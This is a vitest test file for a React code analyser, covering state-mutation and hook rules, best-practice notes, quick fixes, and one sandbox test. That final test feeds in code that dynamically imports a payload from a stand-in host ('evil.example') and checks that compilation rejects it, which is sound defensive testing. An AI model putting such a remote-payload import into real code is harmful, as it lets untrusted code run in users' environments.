import { describe, expect, it } from "vitest";
import { analyzeWith, type Facts } from "@/lib/checks/analyze";
import { bestPracticeNotes, evaluateRule } from "@/lib/checks/static";
import { compileWith } from "@/lib/compile";
import { applyTextEdits } from "@/lib/fix";
import { quickFixes } from "@/lib/quickfix";
import { babel } from "./helpers/sandbox";

function facts(code: string): Facts {
  const result = analyzeWith(babel, code);
  if (!result.ok) throw new Error(result.error.message);
  return result.facts;
}

function fix(code: string): string {
  return applyTextEdits(code, quickFixes(code, facts(code))).code;
}

const todoStarter = `import { useState } from 'react';

export default function App() {
  const [todos, setTodos] = useState([]);

  function addTodo(text) {
    todos.push({ text });
    setTodos(todos);
  }

  return <ul>{todos.map((todo, i) => <li key={i}>{todo.text}</li>)}</ul>;
}
`;

describe("static rules", () => {
  it("flags state mutation and index keys", () => {
    const f = facts(todoStarter);
    const mutation = evaluateRule({ rule: "noStateMutation" }, f);
    expect(mutation.passed).toBe(false);
    expect(mutation.message).toContain("`todos.push()` on line 7 (state)");
    expect(evaluateRule({ rule: "noIndexAsKey" }, f)).toMatchObject({ passed: false });
    expect(evaluateRule({ rule: "listItemsHaveKeys" }, f)).toEqual({ passed: true });
  });

  it("reports mutation of props and module-level values", () => {
    const f = facts(`
const rows = [3, 1, 2];
function Table({ items }) {
  items.reverse();
  return <p>{rows.sort().join()}</p>;
}
export default function App() { return <Table items={[1]} />; }
`);
    const kinds = f.mutations.map((m) => m.kind).sort();
    expect(kinds).toEqual(["module", "prop"]);
  });

  it("counts hooks and enforces min and max", () => {
    const f = facts(`import { useState } from 'react';
export default function App() {
  const [a] = useState(0);
  const [b] = useState(0);
  return <p>{a + b}</p>;
}`);
    expect(evaluateRule({ rule: "usesHook", hook: "useState" }, f).passed).toBe(true);
    expect(evaluateRule({ rule: "usesHook", hook: "useState", max: 1 }, f).passed).toBe(false);
    expect(evaluateRule({ rule: "usesHook", hook: "useEffect" }, f)).toEqual({
      passed: false,
      message: "`useEffect` is not used.",
    });
  });

  it("checks effect dependencies and cleanup", () => {
    const f = facts(`import { useEffect, useState } from 'react';
export default function App({ page }) {
  const [data, setData] = useState(null);
  useEffect(() => {
    fetch('/api?page=' + page).then((r) => r.json()).then(setData);
  }, []);
  useEffect(() => {
    const id = setInterval(() => {}, 1000);
  }, []);
  return <p>{String(data)}</p>;
}`);
    expect(evaluateRule({ rule: "effectHasDepsArray" }, f).passed).toBe(true);
    const deps = evaluateRule({ rule: "effectDepsComplete" }, f);
    expect(deps.passed).toBe(false);
    expect(deps.message).toContain("line 4 uses `page`");
    expect(evaluateRule({ rule: "effectHasCleanup" }, f).passed).toBe(false);
  });

  it("detects read-only inputs and direct DOM access", () => {
    const f = facts(`export default function App() {
  const focus = () => document.getElementById('name').focus();
  return <input value="x" />;
}`);
    expect(evaluateRule({ rule: "controlledInputs" }, f).passed).toBe(false);
    expect(evaluateRule({ rule: "noDirectDom" }, f).passed).toBe(false);
  });
});

describe("best-practice notes", () => {
  it("explains each problem with its line", () => {
    const notes = bestPracticeNotes(facts(todoStarter));
    expect(notes.map((note) => [note.id, note.line])).toEqual([
      ["mutation-7", 7],
      ["index-key-11", 11],
    ]);
    expect(notes[0].text).toContain("React compares state by reference");
  });

  it("is quiet for idiomatic code", () => {
    const notes = bestPracticeNotes(
      facts(`import { useState } from 'react';
export default function App() {
  const [items, setItems] = useState([{ id: 1, name: 'a' }]);
  return <ul>{items.map((item) => <li key={item.id} onClick={() => setItems(items.filter((x) => x !== item))}>{item.name}</li>)}</ul>;
}`),
    );
    expect(notes).toEqual([]);
  });
});

describe("quick fixes", () => {
  it("rewrites push + setState into a copy, touching only that statement", () => {
    const fixed = fix(todoStarter);
    expect(fixed).toContain("setTodos([...todos, { text }]);");
    expect(fixed).not.toContain("todos.push");
    expect(fixed.split("\n").length).toBe(todoStarter.split("\n").length - 1);
    expect(compileWith(babel, fixed).ok).toBe(true);
  });

  it("adds a missing key from the item's id", () => {
    const code = `export default function App({ users }) {
  return <ul>{users.map((user) => <li>{user.id}: {user.name}</li>)}</ul>;
}`;
    expect(fix(code)).toContain("<li key={user.id}>");
  });

  it("adds missing dependencies without the state the effect sets", () => {
    const code = `import { useEffect, useState } from 'react';
export default function App({ page }) {
  const [data, setData] = useState(null);
  useEffect(() => {
    setData(page);
  }, []);
  return <p>{data}</p>;
}`;
    expect(fix(code)).toContain("}, [page]);");
  });

  it("adds a cleanup for an interval", () => {
    const code = `import { useEffect } from 'react';
export default function App() {
  useEffect(() => {
    const id = setInterval(() => {}, 1000);
  }, []);
  return null;
}`;
    const fixed = fix(code);
    expect(fixed).toContain("return () => clearInterval(id);");
    expect(compileWith(babel, fixed).ok).toBe(true);
  });
});

describe("compile sandboxing", () => {
  it("rejects dynamic import() so editor code cannot load remote modules", () => {
    const result = compileWith(
      babel,
      `export default function App() {
  import("https://evil.example/payload.js");
  return null;
}`,
    );
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error.message).toMatch(/import\(\) is not allowed/);
  });
});
